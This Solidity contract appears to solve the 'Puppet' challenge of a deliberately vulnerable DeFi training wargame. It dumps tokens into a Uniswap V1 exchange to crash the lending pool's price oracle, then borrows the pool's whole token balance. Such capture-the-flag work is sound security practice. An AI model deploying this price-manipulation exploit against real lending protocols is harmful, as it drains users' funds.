// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";

contract PuppetAttack {
    address public player;
    DamnValuableToken public token;
    IUniswapV1Exchange public uniswapV1Exchange;
    PuppetPool public lendingPool;
    address public recovery;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;

    constructor(
        address _token,
        address _uniswapV1Exchange,
        address _lendingPool,
        address _recovery
    ) payable {
        token = DamnValuableToken(_token);
        uniswapV1Exchange = IUniswapV1Exchange(_uniswapV1Exchange);
        lendingPool = PuppetPool(_lendingPool);
        recovery = _recovery;
    }

    function execute() external {
        token.transferFrom(msg.sender, address(this), PLAYER_INITIAL_TOKEN_BALANCE);
        token.approve(address(uniswapV1Exchange), type(uint256).max);

        uniswapV1Exchange.tokenToEthSwapInput(
            PLAYER_INITIAL_TOKEN_BALANCE,
            1,
            block.timestamp * 200
        );

        lendingPool.borrow{value: address(this).balance}(POOL_INITIAL_TOKEN_BALANCE, recovery);
    }

    receive() external payable {}
}